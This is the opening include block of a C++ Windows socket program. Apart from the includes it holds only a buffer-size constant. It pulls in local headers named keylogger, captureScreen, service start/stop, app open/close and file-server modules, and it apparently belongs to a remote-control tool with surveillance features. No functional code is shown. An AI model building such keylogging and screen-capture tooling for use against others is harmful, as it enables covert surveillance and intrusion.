#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <cstdlib>
#include <windows.h>
#include <fstream>
#include "listStartStopServices.h"
#include "keylogger.h"
#include "captureScreen.h"
#include "listApp.h"
#include "closeApp.h"
#include "closeFile.h"
#include "getFileServer.h"
#include "openApp.h"

using namespace std;

#define bufferSize 1024